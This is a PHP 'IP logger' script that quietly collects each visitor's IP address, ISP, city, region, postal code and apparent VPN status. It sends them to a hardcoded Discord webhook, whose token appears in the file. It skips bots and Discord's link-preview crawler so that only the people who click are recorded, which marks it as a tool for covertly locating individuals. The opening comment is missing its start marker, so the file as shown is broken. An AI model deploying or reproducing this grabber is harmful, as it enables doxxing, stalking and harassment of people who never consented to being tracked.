<?php

Please keep this copyright statement intact
Original Creator Of This Webhook IP Logger: ᴮᵉᵗᵗᵉʳ ᴼᶠᶠ ᴳᵒⁿᵉ#0869
Creation Date: 21/10/19 
APIs Provided By: Octolus (geoiplookup.io) and IP-API (ip-api.com)
*/ 

$webhookurl = "https://discord.com/api/webhooks/1568767512722669761/lHPjWbbHIPlF0TW-FYnhTYXD5WIKsSINTMbDMy4ZVzT3ctUrcFGK2JX-XuQOvb0DTCpp";

$ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];

if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $browser)) {
    exit();
}

$TheirDate = date('d/m/Y');
$TheirTime = date('G:i:s');

$details = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"));
$vpnCon = json_decode(@file_get_contents("https://json.geoiplookup.io/{$ip}"));

$isp = isset($details->isp) ? $details->isp : "Unknown";
$city = isset($details->city) ? $details->city : "Unknown";
$region = isset($details->region) ? $details->region : "Unknown";
$country = isset($details->country) ? $details->country : "Unknown";
$zip = isset($details->zip) ? $details->zip : "Unknown";

if(isset($vpnCon->connection_type) && $vpnCon->connection_type === "Corporate"){
    $vpn = "Yes (Double Check: $isp)";
} else {
    $vpn = "No (Double Check: $isp)";
}

$data = "**User IP:** $ip\n**ISP:** $isp\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $city \n**Region:** $region\n**Country:** $country\n**Postal Code:** $zip\n**IsVPN?** $vpn (Possible False-Positives)";

$json_data = array('content' => $data, 'username' => "Visitor from: $country");
$make_json = json_encode($json_data);

$ch = curl_init($webhookurl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec($ch);
curl_close($ch);
?>
